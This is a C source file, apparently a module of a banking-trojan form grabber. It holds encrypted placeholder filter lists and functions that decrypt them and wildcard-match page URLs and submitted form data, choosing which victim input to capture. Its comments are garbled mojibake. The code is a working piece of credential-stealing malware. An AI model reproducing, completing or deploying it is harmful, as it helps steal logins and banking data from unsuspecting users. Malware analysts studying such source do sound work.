//---------------------------------------------------------------------------


#pragma hdrstop

#include "Modules.h"
#ifdef FgrFiltersH


//---------------------------------------------------------------------------
#include "Memory.h"
#include "Strings.h"
#include "Crypt.h"

//---------------------------------------------------------------------------

//****************************************************
//  ������ URL ������� � ������� ��� ����� ����������
//  ������ HTML ����.
//****************************************************
char FGR_URL_FILTERS[FGR_FILTERS_MAX_FILTERS_SIZE] = "FGR_URL_FILTERS\0\0";
#define FGR_URL_FILTERS_HASH 0xBB05876C /* FGR_URL_FILTERS */


//****************************************************
//  ������ ����� ��������������� ���� ������
//****************************************************
char FGR_PARAMS_FILTERS[FGR_FILTERS_MAX_PARAMS_FILTERS_SIZE] = "FGR_PARAMS_FILTERS\0\0";
#define FGR_PARAMS_FILTERS_HASH 0xBE738607 /* FGR_PARAMS_FILTERS */


// ������������ ������ ������� � �������
DWORD FGR_FILTERS_MAX_FILTER_LEN = 0;


//---------------------------------------------------------------------
bool FGRFiltersArrayEmpty()
{
	// ������� ���������� ������ ���� ������ �������� ��
	// �������� ������
	return CalcHash(FGR_URL_FILTERS) == FGR_URL_FILTERS_HASH;
}
//---------------------------------------------------------------------

DWORD GetFGRFilterMaxLen()
{
	// ������� ���������� ������������ ������ ������� � �������

	if (FGR_FILTERS_MAX_FILTER_LEN == 0)
	{
		PCHAR Tmp = FGR_URL_FILTERS;
        DWORD Max = 0;
		// ���������� ������
		while (*Tmp != 0)
		{
			Max = StrCalcLength(Tmp);
			if (Max > FGR_FILTERS_MAX_FILTER_LEN)
				FGR_FILTERS_MAX_FILTER_LEN = Max;

			// ��������� � ��������� ������
			Tmp = STR::End(Tmp);
			Tmp++;
        }
	}

	return FGR_FILTERS_MAX_FILTER_LEN;
}
//---------------------------------------------------------------------

bool FiltrateFormGrabberURL(PCHAR URL)
{
	//  ������� ���������� ������ ���� ������
	//	��������������	������������

	if (STR::IsEmpty(URL))
		return false;

	if (FGRFiltersArrayEmpty())
		return true;


	DWORD MaskLen = GetFGRFilterMaxLen();

	PCHAR Mask = STR::Alloc(MaskLen);
	if (Mask == NULL) return true;

	bool Result = false;

	PCHAR Tmp = FGR_URL_FILTERS;

	// ���������� ������
	while (*Tmp != 0)
	{
    	// ���������� ������� ������
		m_memset(Mask, 0, MaskLen);
		Decrypt(Tmp, Mask);

		if (WildCmp(URL, Mask))
		{
			Result = true;
            break;
        }

		// ��������� � ��������� ������
		Tmp = STR::End(Tmp);
		Tmp++;
	}

	STR::Free(Mask);

    return Result;
}
//---------------------------------------------------------------------


//-------------------------------------------------
//  FiltrateFormGrabberData - ������� ����������
//  	������ ���� ������ ������ ����������
//-------------------------------------------------
bool FiltrateFormGrabberData(const char* Data)
{
	if (AnsiStr::IsEmpty(Data))
		return false;

	TStrEnum E(FGR_PARAMS_FILTERS, true, FGR_PARAMS_FILTERS_HASH);

	if (E.IsEmpty())
		return true;

	while (E.Next())
	{
		if (WildCmp((char*)Data, E.Line().t_str()))
            return true;
	}
		
    return false;
}




//---------------------------------------------------------------------------
#endif
